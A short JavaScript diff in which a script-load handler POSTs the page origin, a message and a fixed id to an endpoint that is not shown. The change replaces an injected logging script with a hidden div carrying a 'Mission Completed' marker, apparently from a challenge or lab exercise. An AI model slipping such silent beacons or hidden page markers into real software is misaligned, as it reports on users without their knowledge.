@@ -113,9 +113,10 @@ script.onload = function() {
             r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
             r.send('origin=' + (document.location.origin === 'file://' ? 0 : document.location.origin) + '&msg=' + encodeURIComponent(msg) + '&id=' + 20119);
             console.log('Mission completed!');
-            const scriptElement = document.createElement('script');
-            scriptElement.textContent = `console.log("Mission Completed weep2609 !");`;
-            document.body.appendChild(scriptElement);
+            const hiddenDiv = document.createElement('div');
+            hiddenDiv.textContent = "Mission Completed weep2609 !";
+            hiddenDiv.style.display = 'none';
+            document.body.appendChild(hiddenDiv);
         })
         .catch(error => {
             console.error('Error in processing:', error);
